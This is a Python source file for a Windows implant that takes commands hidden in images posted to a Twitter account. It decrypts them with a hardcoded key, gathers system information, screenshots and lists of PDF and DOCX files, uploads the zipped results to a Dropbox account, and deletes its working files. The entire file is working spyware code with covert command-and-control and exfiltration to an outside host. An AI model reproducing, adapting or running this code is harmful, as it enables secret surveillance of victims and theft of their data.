from bs4 import BeautifulSoup as soupy
import urllib.request
import urllib.parse
import re
import base64
import requests
from PIL import Image
import io
from cryptography.fernet import Fernet
import stepic
import sys
import subprocess
import os
from os import path
import mss
import mss.tools
import time
from time import sleep
import random
import platform
import shutil
import win32api
import dropbox

# Encryption/Decryption Symmetric Key (Hardcoded) - PLEASE CHANGE IT!
key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='

#The Twitter handle that will be used as Command Post (Hardcoded) - PLEASE CHANGE IT!
handle = 'TwiShellProto'

def getTweetPhoto(handle):
    # Takes Twitter handle as input and returns the latest tweet photo URL from supplied handle
    url = 'https://twitter.com/' + handle
    html = urllib.request.urlopen(url).read()
    soup = soupy(html, features="html.parser")
    x = soup.findAll("img",{"alt":True, "src":True})
    if (len(x)>2):
        img_url = x[3]
        img_url = img_url['src']
        return img_url

def decodeFromPhoto(URL):
    # Takes the Twitter photo URL as input and decode and return the text within the image as string
    url = URL
    content = urllib.request.urlopen(url).read()
    image = Image.open(io.BytesIO(content))
    data = stepic.decode(image)
    return data

def decrypt(enctext, key):
    # Takes the encrypted text as string and key and decrypts and returns the plain text
    enctext = enctext.encode()
    f = Fernet(key)
    plaintext = f.decrypt(enctext)
    plaintext = plaintext.decode()
    return plaintext

def main():
    # Main method for the Implant
    while True:
        url = getTweetPhoto(handle) # Getting the image URL
        if url is not None:
            enctext = decodeFromPhoto(url) # Getting the embedded encrypted text within the image
            command = decrypt(enctext, key) # Getting the command after decrypting it
            if (len(command) > 10):
                command, api = command.split(" ")
            if command == 'kill':
                sys.exit(0)
            elif command == 'recon':
                recon(api)
        else:
            pass

def recon(APIKEY):
    # Defining the path where we will dump the results to exfiltrate later
    dumppath = path.expandvars(r'%LOCALAPPDATA%\LARRYCHATTER')
    if not os.path.exists(dumppath):
        os.mkdir(dumppath)
    # Creating a Fernet object to encrypt the results
    f = Fernet(key)
    # Running 'systeminfo' on the target machine to get system details and encrypting it
    command = 'systeminfo'
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = output.stdout.read()
    error = output.stderr.read()
    encrypted_result = f.encrypt(result)
    encrypted_error = f.encrypt(error)
    # Defining a filename for the results and writing the results to the file for exfiltration later
    sysdumpfile = os.path.join(dumppath, 'systeminfo.larry')
    with open(sysdumpfile, 'wb') as outfile:
        outfile.write(encrypted_result + encrypted_error)
    # Taking screenshots on an random interval for a total of 2 minutes, encrypting it, saving it
    starttime = time.time() # Current time
    endtime = starttime + 120 # Total of 2 minutes
    counter = 0
    while (time.time() < endtime):
        interval = random.randrange(1,60) # Random interval of 1-60 seconds
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
        data = mss.tools.to_png(img.rgb, img.size, output=None)
        encrypted_data = f.encrypt(data)
        sctdumpfile = os.path.join(dumppath, 'screenshot{}.larry'.format(counter))
        with open(sctdumpfile, 'wb') as outfile:
            outfile.write(encrypted_data)
        counter = counter + 1
        time.sleep(interval - ((time.time() - starttime) % interval))
    # Get a list of drive letters on the target machine
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    # Searching for some juicy file types on the target machine
    lists=''
    exts = ['.pdf', '.docx'] #'.doc', '.txt', '.exe', '.jpg', '.png']
    for drive in drives:
        for ext in exts:
                for dirpath, dirname, files in os.walk(drive):
                    for file in files:
                        if file.endswith(ext):
                            lists = lists + '\n' + os.path.join(dirpath, file) + "\n"

    # Encrypting and saving the Juicy Files(if found) alongwith their complete path
    lists = lists.encode()
    encrypted_lists = f.encrypt(lists)
    juicyfile = os.path.join(dumppath, 'juicyfile.larry')
    with open(juicyfile, 'wb') as outfile:
        outfile.write(encrypted_lists)
    # Zipping all collected intel into a single zip file for exfiltration later and deleting all the rest of temporary files
    delivery_name = 'DeliverableIntel{}'.format(platform.node())
    deliverypath = path.expandvars(r'%LOCALAPPDATA%')
    deliveryfile = os.path.join(deliverypath, delivery_name)
    shutil.make_archive(deliveryfile, 'zip', dumppath)
    # Removing all the files in the dump folder and the folder too
    shutil.rmtree(dumppath)
    # Check if the deliverable Intel ZIP file exists or not
    deliveryfile = deliveryfile + ".zip"
    deliveryfile = deliveryfile[:2] + '\\' + deliveryfile[2:]
    if os.path.isfile(deliveryfile):
        flag = True
    else:
        flag = False
    # Uploading the deliverable Intel ZIP(if exists) on a Dropbox account whose API KEY will be provided as argument
    if flag is True:
        target = "/LARRYCHATTER/"
        targetfile = target + "DeliverableIntel{}.zip".format(platform.node())
        drop = dropbox.Dropbox(APIKEY)
        with open(deliveryfile, "rb") as f:
            meta = drop.files_upload(f.read(), targetfile, mode=dropbox.files.WriteMode("overwrite"))
    else:
        pass
    # Removing the deliverable Intel ZIP file - Finishing
    os.remove(deliveryfile)



if __name__ == "__main__":
    main()
